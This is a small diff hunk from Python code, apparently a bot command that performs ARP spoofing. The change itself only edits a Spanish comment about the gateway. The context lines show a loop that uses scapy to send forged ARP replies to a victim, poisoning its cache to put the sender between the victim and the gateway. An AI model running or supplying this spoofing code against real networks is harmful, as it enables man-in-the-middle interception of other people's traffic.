@@ -55,7 +55,7 @@ def arp_spoofing(update, context):
         target_mac = received.hwsrc
 
     while True:
-        # Envía una solicitud ARP indicando que la dirección MAC del gateway es la de la víctima
+        # Envía una solicitud ARP indicando que la dirección MAC de la gateway es la de la víctima
         send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
 
         # Envía una solicitud ARP indicando que la dirección MAC de la víctima es la del gateway
